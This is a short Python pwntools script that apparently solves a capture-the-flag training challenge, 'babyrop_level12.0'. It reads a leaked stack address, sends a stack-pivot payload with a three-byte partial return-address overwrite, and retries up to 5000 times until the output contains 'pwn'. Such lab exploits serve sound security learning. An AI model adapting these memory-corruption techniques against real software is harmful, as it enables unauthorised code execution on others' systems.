from pwn import *
import time 

binary = './babyrop_level12.0'
elf = ELF(binary)
context.binary = binary
context.log_level = 'error'  # Suppress logs for speed

# Number of attempts
max_attempts = 5000

# Keep the essential last two bytes fixed
s = '''
b * main+904
'''
for attempt in range(max_attempts):
    try:
        # Start process
        p = process(binary)
        
        p.recvuntil(b"Your input buffer is located at: ")
        buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
        win_ptr_addr = buffer_addr - 8
        
        #gdb.attach(p, s)
        payload = flat(
            buffer_addr - 8,
            b'A'*(0xa0 - 0x10),
            win_ptr_addr - 8,          
            b'\xc8\x78\x05',  # 3-byte partial overwrite with fixed last 2 bytes
        )
        p.send(payload)
        
        # Check output quickly
        output = p.recvall(timeout=0.3)
        print(output)
        if b"pwn" in output:
            break
        
        p.close()
        
    except Exception:
        try:
            p.close()
        except:
            pass
